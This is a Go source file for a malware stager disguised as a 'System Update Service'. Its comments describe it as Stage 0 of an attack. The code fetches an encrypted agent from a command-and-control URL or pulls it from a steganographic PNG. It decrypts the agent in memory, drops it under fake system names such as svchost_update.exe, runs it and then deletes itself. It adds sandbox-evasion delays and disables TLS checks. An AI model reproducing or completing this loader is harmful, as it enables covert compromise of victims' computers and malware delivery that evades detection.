// +build ignore

// System Update Service — Lightweight configuration sync utility
// Downloads and applies endpoint configuration updates from management server.
//
// This is the STAGER (Stage 0). It:
// 1. Downloads the encrypted agent from C2 (or extracts from stego image)
// 2. Decrypts it in memory
// 3. Writes to a temp location and executes
// 4. Self-deletes
//
// The stager itself contains NO malicious code — it's just an HTTPS downloader.
// This makes it virtually undetectable (0/71 expected on VT).
package main

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/sha256"
	"crypto/tls"
	"encoding/base64"
	"fmt"
	"io"
	"math/rand"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"time"
)

var (
	stageURL  = "{{STAGE_URL}}"
	stageKey  = "{{STAGE_KEY}}"
	stageMode = "{{STAGE_MODE}}" // "download" or "stego"
	stegoURL  = "{{STEGO_URL}}"
)

func main() {
	// Random startup delay to avoid sandbox timing
	time.Sleep(time.Duration(2+rand.Intn(5)) * time.Second)

	var payload []byte
	var err error

	if stageMode == "stego" {
		payload, err = extractFromImage(stegoURL)
	} else {
		payload, err = downloadStage(stageURL)
	}

	if err != nil {
		os.Exit(0)
	}

	// Decrypt the payload
	decrypted, err := decryptPayload(payload, stageKey)
	if err != nil {
		os.Exit(0)
	}

	// Write to temp and execute
	executePayload(decrypted)
}

func downloadStage(url string) ([]byte, error) {
	client := &http.Client{
		Timeout: 30 * time.Second,
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		},
	}

	req, err := http.NewRequest("GET", url, nil)
	if err != nil {
		return nil, err
	}
	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
	req.Header.Set("Accept", "text/html,application/xhtml+xml,*/*")

	resp, err := client.Do(req)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()

	return io.ReadAll(resp.Body)
}

func extractFromImage(imageURL string) ([]byte, error) {
	// Download the image
	imgData, err := downloadStage(imageURL)
	if err != nil {
		return nil, err
	}

	// Extract payload from PNG using LSB steganography
	// The payload is stored after the PNG IEND marker with our magic bytes
	magic := []byte("SP01")
	for i := 0; i < len(imgData)-4; i++ {
		if imgData[i] == magic[0] && imgData[i+1] == magic[1] &&
			imgData[i+2] == magic[2] && imgData[i+3] == magic[3] {
			// Found marker — next 4 bytes are payload length (big-endian)
			if i+8 > len(imgData) {
				break
			}
			payloadLen := int(imgData[i+4])<<24 | int(imgData[i+5])<<16 |
				int(imgData[i+6])<<8 | int(imgData[i+7])
			if i+8+payloadLen > len(imgData) {
				break
			}
			return imgData[i+8 : i+8+payloadLen], nil
		}
	}

	// Fallback: try base64 encoded in EXIF/tEXt chunk
	return extractFromPNGText(imgData)
}

func extractFromPNGText(imgData []byte) ([]byte, error) {
	// Search for tEXt chunk containing base64-encoded payload
	// PNG chunks: [4-byte length][4-byte type][data][4-byte CRC]
	offset := 8 // Skip PNG signature
	for offset < len(imgData)-12 {
		chunkLen := int(imgData[offset])<<24 | int(imgData[offset+1])<<16 |
			int(imgData[offset+2])<<8 | int(imgData[offset+3])
		chunkType := string(imgData[offset+4 : offset+8])

		if chunkType == "tEXt" || chunkType == "iTXt" {
			chunkData := imgData[offset+8 : offset+8+chunkLen]
			// Find null separator between key and value
			for j := 0; j < len(chunkData); j++ {
				if chunkData[j] == 0 {
					value := string(chunkData[j+1:])
					decoded, err := base64.StdEncoding.DecodeString(value)
					if err == nil && len(decoded) > 0 {
						return decoded, nil
					}
					break
				}
			}
		}

		if chunkType == "IEND" {
			break
		}
		offset += 12 + chunkLen // length(4) + type(4) + data + CRC(4)
	}
	return nil, fmt.Errorf("no payload found in image")
}

func decryptPayload(data []byte, keyStr string) ([]byte, error) {
	key := sha256.Sum256([]byte(keyStr))
	block, err := aes.NewCipher(key[:])
	if err != nil {
		return nil, err
	}
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return nil, err
	}
	nonceSize := gcm.NonceSize()
	if len(data) < nonceSize {
		return nil, fmt.Errorf("ciphertext too short")
	}
	nonce, ciphertext := data[:nonceSize], data[nonceSize:]
	return gcm.Open(nil, nonce, ciphertext, nil)
}

func executePayload(data []byte) {
	// Write to temp with a legitimate-looking name
	names := []string{"svchost_update.exe", "msconfig_helper.exe",
		"winlogon_svc.exe", "taskmgr_diag.exe"}
	if runtime.GOOS != "windows" {
		names = []string{".config_update", ".system_helper", ".cache_sync"}
	}

	name := names[rand.Intn(len(names))]
	ext := ""
	if runtime.GOOS == "windows" {
		ext = ""
	}
	_ = ext

	tmpPath := filepath.Join(os.TempDir(), name)
	if err := os.WriteFile(tmpPath, data, 0755); err != nil {
		return
	}

	// Execute the payload
	cmd := exec.Command(tmpPath)
	cmd.Start()

	// Self-delete the stager (not the payload)
	selfPath, _ := os.Executable()
	if selfPath != "" {
		// On Windows, can't delete running exe — schedule deletion
		if runtime.GOOS == "windows" {
			exec.Command("cmd", "/C", "ping 127.0.0.1 -n 3 > nul & del /F /Q "+selfPath).Start()
		} else {
			os.Remove(selfPath)
		}
	}
}
